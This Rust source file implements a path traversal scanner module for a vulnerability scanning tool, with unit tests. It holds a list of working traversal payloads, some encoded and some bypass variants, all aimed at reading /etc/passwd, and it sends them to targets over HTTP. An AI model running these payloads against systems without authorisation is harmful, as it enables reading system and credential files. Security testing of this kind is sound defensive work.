use tracing::{debug, info};

use crate::{
    Finding, ScanResult, Scanner, ScannerConfig, ScannerError, ScannerMetadata, ScannerResult,
    Severity, VulnerabilityCategory,
};

/// Path traversal payloads.
const TRAVERSAL_PAYLOADS: &[(&str, &str)] = &[
    ("../../../etc/passwd", "Basic traversal"),
    ("....//....//....//etc/passwd", "Double-encoding bypass"),
    (
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "URL-encoded traversal",
    ),
    (
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "Double URL-encoded traversal",
    ),
    (
        "..%252f..%252f..%252fetc/passwd",
        "Mixed encoding traversal",
    ),
    ("/etc/passwd%00", "Null byte injection"),
    ("..\\..\\..\\etc\\passwd", "Windows-style traversal"),
    ("..%5c..%5c..%5cetc%5cpasswd", "Encoded Windows traversal"),
    (
        "....\\\\....\\\\....\\\\etc\\\\passwd",
        "Double-encoded Windows traversal",
    ),
    ("..;/..;/..;/etc/passwd", "Semicolon bypass (Tomcat)"),
    ("%2e%2e%2e%2e/etc/passwd", "Four-dot traversal"),
];

/// Parameters commonly vulnerable to path traversal.
const TRAVERSAL_PARAMS: &[&str] = &[
    "file", "path", "dir", "folder", "include", "page", "template", "doc", "document", "pdf",
    "image", "img", "pic", "download", "upload", "filename", "name", "src", "source", "resource",
    "load", "read", "view", "show", "display", "content",
];

/// Path Traversal Scanner - detects directory traversal vulnerabilities.
pub struct PathTraversalScanner {
    config: ScannerConfig,
    http_client: reqwest::Client,
}

impl PathTraversalScanner {
    pub fn new() -> Self {
        Self {
            config: ScannerConfig::default(),
            http_client: reqwest::Client::builder()
                .timeout(std::time::Duration::from_secs(10))
                .redirect(reqwest::redirect::Policy::none())
                .build()
                .expect("Failed to create HTTP client"),
        }
    }

    /// Content patterns indicating successful path traversal.
    fn is_file_content(body: &str) -> bool {
        // Unix /etc/passwd patterns
        body.contains("root:x:0:0:")
            || body.contains("root:*:0:0:")
            || body.contains("/bin/bash")
            || body.contains("/bin/sh")
            || body.contains("nobody:x:")
            // Windows hosts/win.ini patterns
            || body.contains("127.0.0.1")
            || body.contains("[fonts]")
            || body.contains("[extensions]")
    }

    /// Tests a parameter for path traversal.
    async fn test_parameter(&self, url: &str, param_name: &str) -> Vec<Finding> {
        let mut findings = Vec::new();
        let parsed = match url::Url::parse(url) {
            Ok(u) => u,
            Err(_) => return findings,
        };

        let base_params: Vec<(String, String)> = parsed
            .query_pairs()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect();

        for (payload, desc) in TRAVERSAL_PAYLOADS {
            let mut test_parsed = parsed.clone();
            let mut new_params: Vec<(String, String)> = base_params
                .iter()
                .map(|(k, v)| {
                    if k == param_name {
                        (k.clone(), payload.to_string())
                    } else {
                        (k.clone(), v.clone())
                    }
                })
                .collect();

            if !new_params.iter().any(|(k, _)| k == param_name) {
                new_params.push((param_name.to_string(), payload.to_string()));
            }

            let query: String = new_params
                .iter()
                .map(|(k, v)| format!("{}={}", k, urlencoding::encode(v)))
                .collect::<Vec<_>>()
                .join("&");
            test_parsed.set_query(Some(&query));
            let full_url = test_parsed.to_string();

            debug!(url = %full_url, payload = %payload, "Testing path traversal");

            if let Ok(response) = self.http_client.get(&full_url).send().await {
                let status = response.status().as_u16();
                let body = response.text().await.unwrap_or_default();

                // Check for file content in response
                if (status == 200 || status == 403 || status == 500) && Self::is_file_content(&body)
                {
                    let finding = Finding::new(
                        format!("Path Traversal via parameter '{}'", param_name),
                        format!(
                            "Parameter '{}' is vulnerable to directory traversal. {} allows reading system files.",
                            param_name, desc
                        ),
                        Severity::High,
                        VulnerabilityCategory::BrokenAccessControl,
                    )
                    .with_url(&full_url)
                    .with_evidence(format!("Payload: {}", payload))
                    .with_evidence(format!(
                        "Response preview: {}",
                        &body[..body.len().min(200)]
                    ))
                    .with_remediation(
                        "Validate file paths against a whitelist. Reject input containing traversal sequences.",
                    )
                    .with_cvss(7.5);

                    findings.push(finding);
                    return findings;
                }

                // Check for error messages that suggest the path was parsed
                let body_lower = body.to_lowercase();
                if body_lower.contains("no such file")
                    || body_lower.contains("file not found")
                    || body_lower.contains("cannot find the path")
                    || body_lower.contains("directory not found")
                {
                    // This might indicate the server tried to access the file but failed
                    // Still worth reporting as medium severity
                    let finding = Finding::new(
                        format!("Potential Path Traversal via '{}'", param_name),
                        format!(
                            "Server responded with file-not-found error for '{}' using traversal payload '{}'. \
                             The server may be attempting to access the file.",
                            param_name, desc
                        ),
                        Severity::Low,
                        VulnerabilityCategory::BrokenAccessControl,
                    )
                    .with_url(&full_url)
                    .with_evidence(format!("Payload: {}", payload))
                    .with_evidence(format!("Error response: {}", &body[..body.len().min(200)]))
                    .with_remediation("Validate and sanitize file path inputs");

                    findings.push(finding);
                    return findings;
                }
            }
        }

        findings
    }

    fn extract_params(url: &str) -> Vec<String> {
        if let Ok(parsed) = url::Url::parse(url) {
            parsed.query_pairs().map(|(k, _)| k.to_string()).collect()
        } else {
            Vec::new()
        }
    }
}

impl Default for PathTraversalScanner {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait::async_trait]
impl Scanner for PathTraversalScanner {
    fn metadata(&self) -> ScannerMetadata {
        ScannerMetadata {
            name: "Path Traversal Scanner".to_string(),
            version: "0.1.0".to_string(),
            supported_targets: vec!["url".to_string(), "domain".to_string()],
            categories: vec![VulnerabilityCategory::BrokenAccessControl],
        }
    }

    async fn initialize(&mut self, config: ScannerConfig) -> ScannerResult<()> {
        self.config = config;
        Ok(())
    }

    async fn scan(&self, target: &spectra_target::Target) -> ScannerResult<ScanResult> {
        let mut result = ScanResult::new(target.id.clone(), "path-traversal");

        let base_url = match target.target_type {
            spectra_target::TargetType::Url => target.value().to_string(),
            spectra_target::TargetType::Domain => format!("https://{}", target.value()),
            _ => {
                return Err(ScannerError::InvalidConfig(format!(
                    "Cannot scan target type {:?}",
                    target.target_type
                )));
            }
        };

        info!(url = %base_url, "Starting path traversal scan");

        let params = Self::extract_params(&base_url);
        for param in &params {
            let findings = self.test_parameter(&base_url, param).await;
            for finding in findings {
                result.add_finding(finding);
            }
        }

        let separator = if base_url.contains('?') { '&' } else { '?' };
        for param in TRAVERSAL_PARAMS {
            if !params.iter().any(|p| p == param) {
                let test_url = format!("{}{}{}=test", base_url, separator, param);
                let findings = self.test_parameter(&test_url, param).await;
                for finding in findings {
                    result.add_finding(finding);
                }
            }
        }

        result.finish();
        Ok(result)
    }

    async fn cleanup(&self) -> ScannerResult<()> {
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn scanner_metadata() {
        let scanner = PathTraversalScanner::new();
        let meta = scanner.metadata();
        assert_eq!(meta.name, "Path Traversal Scanner");
        assert!(meta
            .categories
            .contains(&VulnerabilityCategory::BrokenAccessControl));
    }

    #[test]
    fn extract_params_basic() {
        let params =
            PathTraversalScanner::extract_params("https://example.com/view?file=doc.pdf&id=1");
        assert_eq!(params.len(), 2);
        assert!(params.contains(&"file".to_string()));
    }

    #[test]
    fn is_file_content_passwd() {
        assert!(PathTraversalScanner::is_file_content(
            "root:x:0:0:root:/root:/bin/bash"
        ));
        assert!(PathTraversalScanner::is_file_content(
            "root:*:0:0:System Administrator:/var/root:/bin/zsh"
        ));
        assert!(!PathTraversalScanner::is_file_content("404 Not Found"));
    }

    #[test]
    fn is_file_content_windows() {
        assert!(PathTraversalScanner::is_file_content(
            "[fonts]\n[mci extensions]"
        ));
        assert!(PathTraversalScanner::is_file_content("127.0.0.1 localhost"));
    }

    #[test]
    fn traversal_payloads_count() {
        assert!(TRAVERSAL_PAYLOADS.len() >= 8);
    }

    #[test]
    fn traversal_params_count() {
        assert!(TRAVERSAL_PARAMS.len() >= 10);
    }
}
